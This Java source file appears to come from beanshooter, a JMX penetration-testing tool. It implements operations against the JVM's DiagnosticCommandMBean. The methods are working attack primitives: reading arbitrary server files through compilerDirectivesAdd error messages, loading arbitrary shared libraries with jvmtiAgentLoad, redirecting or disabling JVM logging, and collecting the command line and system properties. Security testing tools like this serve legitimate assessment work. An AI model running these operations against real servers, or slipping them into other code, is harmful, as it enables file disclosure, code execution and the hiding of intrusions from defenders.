package de.qtc.beanshooter.mbean.diagnostic;

import java.lang.reflect.Proxy;

import javax.management.MBeanException;

import de.qtc.beanshooter.cli.ArgumentHandler;
import de.qtc.beanshooter.exceptions.ExceptionHandler;
import de.qtc.beanshooter.io.Logger;
import de.qtc.beanshooter.mbean.MBean;
import de.qtc.beanshooter.mbean.MBeanInvocationHandler;

/**
 * Dispatcher class for DiagnosticCommandMBean operations. Implements the client side for operations that are supported
 * by the DiagnosticCommandMBean.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class Dispatcher extends de.qtc.beanshooter.mbean.Dispatcher
{
    private final DiagnosticCommandMBean diagnostic;

    /**
     * Creates the dispatcher that operates on the DiagnosticCommandMBean.
     */
    public Dispatcher()
    {
        super(MBean.DIAGNOSTIC_COMMAND);

        MBeanInvocationHandler invo = new MBeanInvocationHandler(bean.getObjectName(), getMBeanServerConnection());
        diagnostic = (DiagnosticCommandMBean) Proxy.newProxyInstance(Dispatcher.class.getClassLoader(),
                                                  new Class<?>[] { DiagnosticCommandMBean.class },
                                                  invo);
    }

    /**
     * The readFile operation abuses the compilerDirectivesAdd function of the DiagnosticCommandMBean.
     * This function expects file names with additional compiler directives in JSON format. By supplying
     * an arbitrary other file that contains invalid JSON data, the file contents can be obtained from the
     * resulting exception. The idea was taken from https://github.com/laluka/jolokia-exploitation-toolkit
     */
    public void readFile()
    {
        String filename = ArgumentHandler.require(DiagnosticCommandOption.FILENAME);

        try
        {
            String output = diagnostic.compilerDirectivesAdd(new String[] { filename });

            if (DiagnosticCommandOption.RAW.getBool())
                Logger.printlnPlainBlue(output.trim());

            else if (output.startsWith("Could not load file"))
            {
                Logger.eprintlnMixedBlue("The server was unable to open the file", filename);
                Logger.eprintln("This could mean that the file does not exist, is a directory or the sever is missing permissions.");
            }

            else if (output.startsWith("Syntax error on line") && output.contains(" At '"))
            {
                output = output.substring(output.indexOf('\n')+1);
                output = output.substring(output.indexOf('\n')+1);

                int endIndex = output.indexOf("Parsing of compiler directives failed");
                Logger.printlnPlainBlue(output.substring(0, endIndex).trim());
            }

            else
                Logger.printlnPlainBlue(output.trim());
        }

        catch (MBeanException e)
        {
            ExceptionHandler.unexpectedException(e, "calling", "compilerDirectivesAdd", true);
        }
    }

    /**
     * The loadLibrary function uses the jvmtiAgentLoad operation on the DiagnosticCommands MBean to load
     * a shared library. The idea was taken from https://github.com/laluka/jolokia-exploitation-toolkit
     */
    public void loadLibrary()
    {
        String filename = ArgumentHandler.require(DiagnosticCommandOption.LIBRARY_PATH);

        try
        {
            String output = diagnostic.jvmtiAgentLoad(new String[] { filename });

            if (output.contains("No such file or directory"))
                Logger.eprintlnMixedBlue("The server was unable to find the shared library", filename);

            else if (output.contains("Is a directory"))
                Logger.eprintlnMixedBlue("The specified filename", filename, "is a directory.");

            else if (output.contains("Agent_OnAttach is not available in"))
            {
                Logger.printlnMixedBlue("The server complained about the missing function", "Agent_OnAttach");
                Logger.printlnYellow("The specified library was loaded succesfully.");
            }

            else
                Logger.printlnBlue(output.trim());
        }

        catch (MBeanException e)
        {
            ExceptionHandler.unexpectedException(e, "calling", "jvmtiAgentLoad", true);
        }
    }

    /**
     * The setLogfile function uses the vmLog operation on the DiagnosticCommands MBean to set a new location
     * for the Java virtual machine logfile.
     */
    public void setLogfile()
    {
        String filename = ArgumentHandler.require(DiagnosticCommandOption.FILENAME);

        try
        {
            String output = diagnostic.vmLog(new String[] { "output=" + filename });

            if (output.contains("No such file or directory"))
                Logger.eprintlnMixedBlue("The server was unable to write to", filename);

            else if (output.contains("Is a directory"))
                Logger.eprintlnMixedBlue("The specified filename", filename, "is a directory.");

            else if (output.isEmpty())
                Logger.printlnMixedBlue("Logfile path was successfully set to", filename);

            else
                Logger.printlnBlue(output.trim());
        }

        catch (MBeanException e)
        {
            ExceptionHandler.unexpectedException(e, "calling", "vmLog", true);
        }
    }

    /**
     * The disableLogging function uses the vmLog operation on the DiagnosticCommands MBean disable logging
     * within the Java virtual machine.
     */
    public void disableLogging()
    {
        try
        {
            String output = diagnostic.vmLog(new String[] { "disable" });

            if (output.isEmpty())
                Logger.printlnBlue("Logging was disabled successfully.");

            else
                Logger.eprintlnBlue(output.trim());
        }

        catch (MBeanException e)
        {
            ExceptionHandler.unexpectedException(e, "calling", "vmLog", true);
        }
    }

    /**
     * The getCommandLine function uses the vmCommandLine operation on the DiagnosticCommands MBean to obtain
     * the command line string the JVM was started with.
     */
    public void getCommandLine()
    {
        try
        {
            Logger.printlnPlainBlue(diagnostic.vmCommandLine().trim());
        }

        catch (MBeanException e)
        {
            ExceptionHandler.unexpectedException(e, "calling", "vmCommandline", true);
        }
    }

    /**
     * The getCommandLine function uses the vmCommandLine operation on the DiagnosticCommands MBean to obtain
     * the command line string the JVM was started with.
     */
    public void getSystemProperties()
    {
        try
        {
            Logger.printlnPlainBlue(diagnostic.vmSystemProperties().trim());
        }

        catch (MBeanException e)
        {
            ExceptionHandler.unexpectedException(e, "calling", "vmSystemProperties", true);
        }
    }
}
